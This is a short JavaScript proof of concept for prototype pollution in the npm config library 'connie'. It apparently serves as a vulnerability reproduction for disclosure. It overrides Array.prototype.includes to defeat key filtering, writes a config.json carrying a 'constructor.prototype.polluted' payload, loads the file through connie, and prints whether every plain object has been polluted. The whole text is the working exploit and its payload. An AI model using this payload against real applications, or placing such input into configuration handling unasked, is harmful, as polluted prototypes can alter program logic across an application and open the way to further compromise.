Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const connie = require('connie');
const fs = require('fs');
const path = require('path');
const pathToConfig = path.resolve(__dirname, './config.json');
fs.writeFileSync(pathToConfig, `{"constructor": {"prototype": {"polluted":"yes"}}}`);
connie('file', pathToConfig).read().then(() => {
    console.log({}.polluted);
    fs.unlinkSync(pathToConfig);
});